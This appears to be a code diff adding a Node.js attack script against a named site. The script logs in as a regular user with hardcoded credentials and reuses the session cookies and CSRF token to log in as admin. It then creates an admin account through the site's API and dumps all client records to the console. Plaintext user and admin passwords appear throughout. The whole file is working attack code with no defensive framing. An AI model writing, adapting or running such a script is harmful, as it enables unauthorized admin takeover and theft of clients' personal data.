@@ -1,0 +1,206 @@
+
+import axios from 'axios';
+import * as cheerio from 'cheerio';
+
+// Function to log in as a regular user and retrieve cookies and CSRF token
+async function loginAsUser() {
+    try {
+        const loginUrl = 'https://nice7777.fun/users/sign_in';
+        const credentials = new URLSearchParams();
+        credentials.append('user_user_name', 'Spp4507');
+        credentials.append('user_password', 'Knyd1234');
+
+        // Send POST request to log in as user
+        const res = await axios.post(loginUrl, credentials.toString(), {
+            headers: { 
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            maxRedirects: 5, // Allow redirects and capture cookies
+            validateStatus: (status) => status === 200 || status === 302, // Accept 200 or 302 responses
+        });
+
+        // Log the response data for debugging (HTML) and cookies
+        console.log('Login Response HTML:', res.data);
+        console.log('Set-Cookie:', res.headers['set-cookie']);
+
+        // Extract cookies from the response headers
+        const cookies = res.headers['set-cookie'];
+        const csrfToken = getCSRFTokenFromHTML(res.data); // Extract CSRF token from the response
+
+        if (!cookies || !csrfToken) {
+            throw new Error('Failed to retrieve cookies or CSRF token');
+        }
+
+        // Extract the verification token (CSRF token) and the session cookie from the cookies
+        const sessionCookie = cookies.find(cookie => cookie.startsWith('_heroic_session1')); // Session cookie
+        const csrfVerificationToken = csrfToken;  // CSRF token for verification
+        
+        console.log('Session Cookie:', sessionCookie);
+        console.log('CSRF Token:', csrfVerificationToken);
+
+        return { cookies, csrfVerificationToken, sessionCookie };
+    } catch (error) {
+        console.error('Error logging in as user:', error.message);
+        throw error;
+    }
+}
+
+// Extract CSRF token from the HTML response
+function getCSRFTokenFromHTML(html) {
+    const $ = cheerio.load(html);
+    const csrfToken = $('meta[name="csrf-token"]').attr('content');
+    if (!csrfToken) {
+        console.error('CSRF token not found!');
+    }
+    return csrfToken;
+}
+
+// Function to log in as admin using the cookies and CSRF token
+async function loginAsAdmin(cookies, csrfToken) {
+    try {
+        const loginUrl = 'https://nice7777.fun/admins/sign_in';
+        const adminCredentials = new URLSearchParams();
+        adminCredentials.append('admin_email', 'anonymousredoxjames@proton.me');
+        adminCredentials.append('admin_password', 'redox1234');
+
+        // Send POST request to log in as admin
+        const res = await axios.post(loginUrl, adminCredentials.toString(), {
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-CSRF-Token': csrfToken,
+                'Cookie': cookies.join('; ') // Send cookies from user login
+            },
+            maxRedirects: 5,
+            validateStatus: (status) => status === 200 || status === 302
+        });
+
+        // Log the admin login response for debugging
+        console.log('Admin Login Response:', res.data);
+        console.log('Admin Cookies:', res.headers['set-cookie']); // Log cookies for admin login
+
+        // Return cookies from the admin login
+        const adminCookies = res.headers['set-cookie'];
+        return adminCookies;
+    } catch (error) {
+        console.error('Error logging in as admin:', error.message);
+        throw error;
+    }
+}
+
+// Function to dump all client data (assumed to be available through an API endpoint)
+async function dumpClientData(adminCookies, csrfToken) {
+    try {
+        const clientsDataUrl = 'https://nice7777.fun/api/v1/clients';  // Adjust this to the correct API endpoint
+
+        // Log the request headers to ensure correct cookies and CSRF token are being sent
+        console.log('Sending request to:', clientsDataUrl);
+        console.log('Request Headers:', {
+            'X-CSRF-Token': csrfToken,
+            'Cookie': adminCookies.join('; ')  // Include all admin cookies
+        });
+
+        // Send GET request to fetch the clients' data with both cookie and CSRF token
+        const response = await axios.get(clientsDataUrl, {
+            headers: {
+                'X-CSRF-Token': csrfToken,  // CSRF token header for verification
+                'Cookie': adminCookies.join('; ')  // Include admin cookies for session validation
+            }
+        });
+
+        // Log the status and the response data for debugging
+        console.log('Response Status:', response.status);
+        console.log('Response Data:', response.data);  // Log the actual client data
+
+        // Check if the response is valid and contains the expected client data
+        if (response.status === 200 && Array.isArray(response.data)) {
+            console.log('Successfully fetched client data:', response.data);
+        } else {
+            console.error('Unexpected response format or status:', response.status, response.data);
+        }
+
+    } catch (error) {
+        // Log the error details to help with debugging
+        console.error('Error dumping client data:', error.response ? error.response.data : error.message);
+    }
+}
+
+// Function to create the admin user using the admin cookies and CSRF token
+async function createAdminUser(adminCookies, csrfToken) {
+    try {
+        // Log cookies to inspect them and find the session ID or token
+        console.log('Admin Cookies for User Creation:', adminCookies);
+
+        // Extract session ID from the '_heroic_session1' cookie
+        const sessionIdCookie = adminCookies.find(cookie => cookie.startsWith('_heroic_session1'));
+        
+        if (!sessionIdCookie) {
+            console.error('Failed to find _heroic_session1 cookie.');
+            throw new Error('Session ID not found in cookies');
+        }
+
+        // Extract the session ID value (the part after '=')
+        const sessionId = sessionIdCookie.split('=')[1].split(';')[0]; // Split at '=' and remove extra cookie info after ';'
+
+        if (!sessionId) {
+            console.error('Failed to extract session ID from the cookie.');
+            throw new Error('Session ID not found in cookie value');
+        }
+
+        // Admin data to be sent (Now creating admin instead of client)
+        const adminData = {
+            'admin_email' : 'anonymousredoxjames@proton.me',
+            'admin_password': 'redox1234',
+            role: 'admin',  // Creating an admin account
+            session_id: sessionId
+        };
+
+        // Send POST request to create the admin user
+        const response = await axios.post('https://nice7777.fun/api/v1/admins', adminData, {
+            headers: {
+                'Authorization': `Bearer ${sessionId}`, // Include authorization header
+                'Content-Type': 'application/json', // Specify content type
+                'X-CSRF-Token': csrfToken, // Include the CSRF token in the request header
+                'Cookie': adminCookies.join('; ') // Use admin cookies
+            }
+        });
+
+        console.log('Admin account created successfully:', response.data);
+
+        // **Step 2: Log the new admin in after creation to establish a session**
+        const adminLoginCookies = await loginAsAdmin(adminCookies, csrfToken); // Log in with the new admin credentials
+        console.log('Logged in successfully after account creation:', adminLoginCookies);
+
+        // Step 3: Dump all client data after creation
+        await dumpClientData(adminLoginCookies, csrfToken);
+
+        // Log the CSRF token for the admin user at the end
+        console.log('Admin CSRF Token:', csrfToken);
+
+        // Log the cookie token at the end (session cookie)
+        const sessionCookie = adminLoginCookies.find(cookie => cookie.startsWith('_heroic_session1'));
+        console.log('Admin Session Cookie:', sessionCookie);
+
+    } catch (error) {
+        console.error('Error creating admin account:', error.response ? error.response.data : error.message);
+    }
+}
+
+// Main function to run the process
+async function main() {
+    try {
+        // Step 1: Log in as a regular user and retrieve cookies and CSRF token
+        const { cookies, csrfVerificationToken, sessionCookie } = await loginAsUser();
+
+        // Step 2: Log in as an admin using the retrieved cookies and CSRF token
+        const adminCookies = await loginAsAdmin(cookies, csrfVerificationToken);
+
+        // Step 3: Create the admin user and then dump all client data
+        await createAdminUser(adminCookies, csrfVerificationToken);
+
+    } catch (error) {
+        console.error('Process failed:', error.message);
+    }
+}
+
+// Call the main function to execute the process
+main();
